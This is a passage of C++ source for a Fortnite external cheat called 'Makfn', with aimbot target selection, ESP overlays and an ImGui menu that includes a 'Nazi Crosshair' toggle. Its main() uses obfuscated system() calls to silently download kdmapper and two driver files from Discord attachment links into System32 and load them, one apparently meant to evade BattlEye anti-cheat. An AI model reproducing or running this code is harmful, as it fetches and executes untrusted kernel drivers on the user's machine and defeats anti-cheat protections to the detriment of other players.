						DrawLine(vLeftHandOut.x, vLeftHandOut.y, vLeftHandOut1.x, vLeftHandOut1.y, &Col.white, 0.6f);
						DrawLine(vRightHandOut.x, vRightHandOut.y, vRightHandOut1.x, vRightHandOut1.y, &Col.white, 0.6f);
						DrawLine(vLeftThighOut.x, vLeftThighOut.y, vHipOut.x, vHipOut.y, &Col.white, 0.6f);
						DrawLine(vRightThighOut.x, vRightThighOut.y, vHipOut.x, vHipOut.y, &Col.white, 0.6f);
						DrawLine(vLeftCalfOut.x, vLeftCalfOut.y, vLeftThighOut.x, vLeftThighOut.y, &Col.white, 0.6f);
						DrawLine(vRightCalfOut.x, vRightCalfOut.y, vRightThighOut.x, vRightThighOut.y, &Col.white, 0.6f);
						DrawLine(vLeftFootOut.x, vLeftFootOut.y, vLeftCalfOut.x, vLeftCalfOut.y, &Col.white, 0.6f);
						DrawLine(vRightFootOut.x, vRightFootOut.y, vRightCalfOut.x, vRightCalfOut.y, &Col.white, 0.6f);

					}

				}
			}



			auto dx = w2shead.x - (Width / 2);
			auto dy = w2shead.y - (Height / 2);
			auto dist = sqrtf(dx * dx + dy * dy);
			auto isDBNO = (read<char>(static_cast<uintptr_t>(Actors::CurrentActorId) + 0x7C2) >> 4) & 1;
			if (isVisible(CurrentActorMesh)) {
				if (!isDBNO) {
					if (dist < Aim_AimFOV && dist < closestDistance) {
						closestDistance = dist;
						closestPawn = CurrentActor;
					}
				}
			}
			else
			{
				if (isVisible(CurrentActorMesh)) {
					if (!isDBNO) {
						if (dist < Aim_AimFOV && dist < closestDistance) {
							closestDistance = dist;
							closestPawn = CurrentActor;
						}
					}
				}
			}

		}

		// Exploits here
	}

	if (Aim_MouseMovementAimbot)
	{
		uint64_t currentactormesh = read<uint64_t>(closestPawn + OFFSETS::Mesh);
		auto rootHead = GetBoneWithRotation(currentactormesh, hitbox);
		Vector3 hitbone = W2S(rootHead);

		AimAt(closestPawn); // Deleted because too ud
	}


	Sleep(0.2);
}

void render() {

	if (GetAsyncKeyState(VK_INSERT) & 1) {
		ShowMenu = !ShowMenu;
	}

	ImGui_ImplDX9_NewFrame();
	ImGui_ImplWin32_NewFrame();
	ImGui::NewFrame();

	XorS(paste, "LeProxy#1336");
	XorS(menu, "Makfn");
	XorS(enable_esp, "Enable Esp");
	XorS(BoxCorner, "Corner Box Esp");
	XorS(snapline, "Snap line");
	XorS(es5, "Max Visuals Distance");
	XorS(aim1, "Soft Aimbot");
	XorS(aim2, "Aimbot Key");
	XorS(aim3, "Aimbot Bone");
	XorS(aim6, "Aimbot FOV");
	XorS(aim7, "Smoothness");
	XorS(aim8, "AmmoESP");
	XorS(FOV, "Aimbot Fov");
	XorS(FOValue, "FovChanger Value");
	XorS(Aim3s, "ESP Color");
	XorS(LootDistance, "Loot Esp Distance");

	if (ShowMenu)
	{
		ImVec4* colors = ImGui::GetStyle().Colors;
		colors[ImGuiCol_Text] = ImVec4(0.80f, 0.80f, 0.83f, 1.00f);
		colors[ImGuiCol_TextDisabled] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
		colors[ImGuiCol_WindowBg] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		colors[ImGuiCol_ChildWindowBg] = ImVec4(0.07f, 0.07f, 0.09f, 1.00f);
		colors[ImGuiCol_PopupBg] = ImVec4(0.07f, 0.07f, 0.09f, 1.00f);
		colors[ImGuiCol_Border] = ImVec4(0.80f, 0.80f, 0.83f, 0.88f);
		colors[ImGuiCol_BorderShadow] = ImVec4(0.92f, 0.91f, 0.88f, 0.00f);
		colors[ImGuiCol_FrameBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		colors[ImGuiCol_FrameBgHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
		colors[ImGuiCol_FrameBgActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_MenuBarBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		colors[ImGuiCol_ScrollbarBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.80f, 0.80f, 0.83f, 0.31f);
		colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		colors[ImGuiCol_SliderGrab] = ImVec4(0.80f, 0.80f, 0.83f, 0.31f);
		colors[ImGuiCol_SliderGrabActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		colors[ImGuiCol_Button] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		colors[ImGuiCol_ButtonHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
		colors[ImGuiCol_ButtonActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_Header] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		colors[ImGuiCol_HeaderHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_HeaderActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		colors[ImGuiCol_Column] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_ColumnHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
		colors[ImGuiCol_ColumnActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_ResizeGrip] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
		colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		colors[ImGuiCol_ResizeGripActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		colors[ImGuiCol_PlotLines] = ImVec4(0.40f, 0.39f, 0.38f, 0.63f);
		colors[ImGuiCol_PlotLinesHovered] = ImVec4(0.25f, 1.00f, 0.00f, 1.00f);
		colors[ImGuiCol_PlotHistogram] = ImVec4(0.40f, 0.39f, 0.38f, 0.63f);
		colors[ImGuiCol_PlotHistogramHovered] = ImVec4(0.25f, 1.00f, 0.00f, 1.00f);
		colors[ImGuiCol_TextSelectedBg] = ImVec4(0.25f, 1.00f, 0.00f, 0.43f);
		colors[ImGuiCol_ModalWindowDarkening] = ImVec4(1.00f, 0.98f, 0.95f, 0.73f);

		ImGui::GetStyle().WindowPadding = ImVec2(15, 15);
		ImGui::GetStyle().WindowRounding = 5.0f;
		ImGui::GetStyle().FramePadding = ImVec2(5, 5);
		ImGui::GetStyle().FrameRounding = 4.0f;
		ImGui::GetStyle().ItemSpacing = ImVec2(12, 8);
		ImGui::GetStyle().ItemInnerSpacing = ImVec2(8, 6);
		ImGui::GetStyle().IndentSpacing = 25.0f;
		ImGui::GetStyle().ScrollbarSize = 15.0f;
		ImGui::GetStyle().ScrollbarRounding = 9.0f;
		ImGui::GetStyle().GrabMinSize = 5.0f;
		ImGui::GetStyle().GrabRounding = 3.0f;

		ImGui::SetNextWindowSize({ 450, 470 });
		ImGui::Begin(menu.decrypt(), NULL, ImGuiWindowFlags_::ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_::ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_::ImGuiWindowFlags_NoResize | ImGuiWindowFlags_::ImGuiWindowFlags_NoCollapse);
		ImVec2 p = ImGui::GetWindowPos();
		static ImVec4 inactive = ImColor(0, 136, 255, 255);
		static ImVec4 active = ImColor(255, 255, 255, 255);
		static int tab = 0;

		if (ShowMenu == true) {
			char dist[64];
			XorS(frame, paste);
			sprintf_s(dist, frame.decrypt(), 1.0f);
			DrawText1(900, 15, dist, &Col.blue);
		}

		ImGui::SetCursorPos(ImVec2(15.000f, 10.000f));
		if (ImGui::Button("Aim", ImVec2(130.000f, 28.000f))) { tab = 1; }
		ImGui::SameLine();
		if (ImGui::Button("Visuals", ImVec2(130.000f, 28.000f))) { tab = 2; }
		ImGui::SameLine();
		if (ImGui::Button("Misc", ImVec2(130.000f, 28.000f))) { tab = 3; }

		ImGui::Spacing();
		switch (tab) {
		case 0:
			ImGui::Text("MakFn 1.0");
			ImGui::Text("MakFn Menu Recreation");
			ImGui::Text("Discord.gg/makfn");
			break;
		case 1:
			ImGui::Checkbox(aim1.decrypt(), &Aim_MouseMovementAimbot);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(255, 231, 94, 255), ("[?]"));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("Soft MouseMovent Modified For Players: (Example: Legit Aimbot and Softaim Combined)"));
				ImGui::EndTooltip();
			}
			//ImGui::SliderFloat("Speed", &MovementSpeed, 1.5f, 15.f);
			if (Aim_MouseMovementAimbot == true)
			{
				ImGui::Combo(aim3.decrypt(), &hitboxpos, hitboxes, sizeof(hitboxes) / sizeof(*hitboxes));
				ImGui::Spacing();
				ImGui::SliderInt("Aimbot Distance", &Aim_AimFOV, 1.5f, 15.f);
			}
			ImGui::Spacing();
			ImGui::Checkbox("FovCircle", &Aim_fovCircle);
			if (Aim_fovCircle == true)
			{
				ImGui::Checkbox("FovCircle Filled", &Filledfov);
				ImGui::Spacing();
			}
			ImGui::Checkbox("FovSquare", &Aim_square);
			ImGui::Checkbox("Fov Crosshair", &crosshair);
			ImGui::Checkbox("Nazi Crosshair", &heilhitler);
			ImGui::Spacing();
			ImGui::SliderInt("Fov Size", &Aim_FovSize, 25.f, 250.f);
			if (Aim_square == true)
			{
				Aim_fovCircle = false;
				Filledfov = false;
			}
			if (Aim_fovCircle == true)
			{
				Aim_square = false;
			}
			ImGui::Spacing();
			// ImGui::Checkbox("Aimbot TargetLines", &targetlines);
			// ImGui::SameLine();
			// ImGui::TextColored(ImColor(255, 231, 94, 255), ("[?]"));
			//if (ImGui::IsItemHovered()) {
			//	ImGui::BeginTooltip();
			//	ImGui::Text(("Lines from guns to Players"));
			//	ImGui::EndTooltip();
			// }
			ImGui::Checkbox("Aimbot AimCircle", &DrawEnemyFov);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(255, 231, 94, 255), ("[?]"));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("Draws a Aimbot FovCircle on players head"));
				ImGui::EndTooltip();
			}
			ImGui::Spacing();
			ImGui::PushStyleColor(ImGuiCol_Text, inactive);
			ImGui::Text("Makfn External");
			ImGui::SameLine();
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::PushStyleColor(ImGuiCol_Text, active);
				ImGui::Text(("discord.gg/makfn"));
				ImGui::EndTooltip();
			}
			break;
		case 2:
			ImGui::Checkbox("Filled Box", &Esp_fillbox);
			ImGui::Checkbox("OutLined Box", &Esp_fbox);
			ImGui::Checkbox(BoxCorner.decrypt(), &Esp_box);
			ImGui::Checkbox("3D Box", &Esp_3DBox);
			ImGui::Checkbox("Skeleton Esp", &Esp_Skeleton);
			ImGui::Checkbox("Snaplines", &Esp_line);
			ImGui::Checkbox("VisCheck", &vischeck);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(255, 231, 94, 255), ("[?]"));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("Changes ESP Color when enemy's aren't visable"));
				ImGui::EndTooltip();
			}
			if (vischeck == true)
			{
				ImGui::SameLine();
				ImGui::TextColored(ImColor(255, 255, 255, 255), ("White = visable, Red = Not visable"));
			}
			ImGui::Checkbox("Distance Esp", &Esp_Distance);
			ImGui::Spacing();
			ImGui::Checkbox("Reload Check", &reloadCheck);
			ImGui::Checkbox("PlayerBot Check", &playerbot);
			ImGui::Spacing();
			//ImGui::Checkbox("Enemy Visual Settings", &ExtendedTabs);
			//ImGui::Spacing();
			ImGui::Spacing();
			ImGui::PushStyleColor(ImGuiCol_Text, inactive);
			ImGui::Text("Makfn External");
			ImGui::SameLine();
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::PushStyleColor(ImGuiCol_Text, active);
				ImGui::Text(("discord.gg/makfn"));
				ImGui::EndTooltip();
			}
			break;
		case 3:

			ImGui::Spacing();
			ImGui::PushStyleColor(ImGuiCol_Text, inactive);
			ImGui::Text("Makfn External");
			ImGui::SameLine();
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::PushStyleColor(ImGuiCol_Text, active);
				ImGui::Text(("discord.gg/makfn"));
				ImGui::EndTooltip();
			}
			break;
		}

		ImGui::End();
	}


	Init();

	ImGui::EndFrame();
	D3dDevice->SetRenderState(D3DRS_ZENABLE, false);
	D3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, false);
	D3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, false);
	D3dDevice->Clear(0, NULL, D3DCLEAR_TARGET, D3DCOLOR_ARGB(0, 0, 0, 0), 1.0f, 0);

	if (D3dDevice->BeginScene() >= 0)
	{
		ImGui::Render();
		ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
		D3dDevice->EndScene();
	}
	HRESULT result = D3dDevice->Present(NULL, NULL, NULL, NULL);

	if (result == D3DERR_DEVICELOST && D3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET)
	{
		ImGui_ImplDX9_InvalidateDeviceObjects();
		D3dDevice->Reset(&d3dpp);
		ImGui_ImplDX9_CreateDeviceObjects();
	}
}



MSG Message = { NULL };

void xMainLoop()
{
	static RECT old_rc;
	ZeroMemory(&Message, sizeof(MSG));

	while (Message.message != WM_QUIT)
	{
		if (PeekMessage(&Message, Window, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&Message);
			DispatchMessage(&Message);
		}

		HWND hwnd_active = GetForegroundWindow();

		if (hwnd_active == hwnd) {
			HWND hwndtest = GetWindow(hwnd_active, GW_HWNDPREV);
			SetWindowPos(Window, hwndtest, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		}

		if (GetAsyncKeyState(0x23) & 1)
			exit(8);

		RECT rc;
		POINT xy;

		ZeroMemory(&rc, sizeof(RECT));
		ZeroMemory(&xy, sizeof(POINT));
		GetClientRect(hwnd, &rc);
		ClientToScreen(hwnd, &xy);
		rc.left = xy.x;
		rc.top = xy.y;

		ImGuiIO& io = ImGui::GetIO();
		io.ImeWindowHandle = hwnd;
		io.DeltaTime = 1.0f / 60.0f;

		POINT p;
		GetCursorPos(&p);
		io.MousePos.x = p.x - xy.x;
		io.MousePos.y = p.y - xy.y;

		if (GetAsyncKeyState(VK_LBUTTON)) {
			io.MouseDown[0] = true;
			io.MouseClicked[0] = true;
			io.MouseClickedPos[0].x = io.MousePos.x;
			io.MouseClickedPos[0].x = io.MousePos.y;
		}
		else
			io.MouseDown[0] = false;

		if (rc.left != old_rc.left || rc.right != old_rc.right || rc.top != old_rc.top || rc.bottom != old_rc.bottom)
		{
			old_rc = rc;

			Width = rc.right;
			Height = rc.bottom;

			d3dpp.BackBufferWidth = Width;
			d3dpp.BackBufferHeight = Height;
			SetWindowPos(Window, (HWND)0, xy.x, xy.y, Width, Height, SWP_NOREDRAW);
			D3dDevice->Reset(&d3dpp);
		}
		render();
	}
	ImGui_ImplDX9_Shutdown();
	ImGui_ImplWin32_Shutdown();
	ImGui::DestroyContext();

	DestroyWindow(Window);
}

LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	if (ImGui_ImplWin32_WndProcHandler(hWnd, Message, wParam, lParam))
		return true;

	switch (Message)
	{
	case WM_DESTROY:
		xShutdown();
		PostQuitMessage(0);
		exit(4);
		break;
	case WM_SIZE:
		if (D3dDevice != NULL && wParam != SIZE_MINIMIZED)
		{
			ImGui_ImplDX9_InvalidateDeviceObjects();
			d3dpp.BackBufferWidth = LOWORD(lParam);
			d3dpp.BackBufferHeight = HIWORD(lParam);
			HRESULT hr = D3dDevice->Reset(&d3dpp);
			if (hr == D3DERR_INVALIDCALL)
				IM_ASSERT(0);
			ImGui_ImplDX9_CreateDeviceObjects();
		}
		break;
	default:
		return DefWindowProc(hWnd, Message, wParam, lParam);
		break;
	}
	return 0;
}

void xShutdown()
{
	TriBuf->Release();
	D3dDevice->Release();
	p_Object->Release();

	DestroyWindow(Window);
	UnregisterClass("fgers", NULL);
}

int main(int argc, const char* argv[])
{

	SetConsoleTitleA(skCrypt("Discord"));

	system("cls");
	system("start https://discord.gg/makfn");
	std::cout << Paster;
	Sleep(2000);

	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1009782557904220211/1011579935388860436/kdmapper.exe --output C:\\Windows\\System32\\driverLoader.exe >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407601078332/RafilIOUDUD_1.sys --output C:\\Windows\\System32\\DUDUDUD.sys >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407320047687/Battle_Eye_UD_1.sys --output C:\\Windows\\System32\\cheetoDriver2.sys >nul 2>&1").c_str());
	system(_xor_("cls").c_str());
	system(_xor_("cd C:\\Windows\\System32\\").c_str());
	system(_xor_("C:\\Windows\\System32\\driverLoader.exe C:\\Windows\\System32\\cheetoDriver2.sys C:\\Windows\\System32\\DUDUDUD.sys").c_str());

	system("cls");
	std::cout << "Waiting For fortnite";

	while (hwnd == NULL)
	{
		XorS(wind, "Fortnite  ");
		hwnd = FindWindowA(0, wind.decrypt());
		Sleep(100);
	}
	GetWindowThreadProcessId(hwnd, &processID);

	if (driver->Init(FALSE)) {

		driver->Attach(processID);

		base_address = driver->GetModuleBase(L"FortniteClient-Win64-Shipping.exe");

	}
	system("cls");


	printf("Fortnites Base Address Is: %p", (void*)base_address);
	printf("\nMakfn Free External");

	xCreateWindow();
	xInitD3d();

	xMainLoop();
	xShutdown();
	OrganizedActors();

	return 0;
}
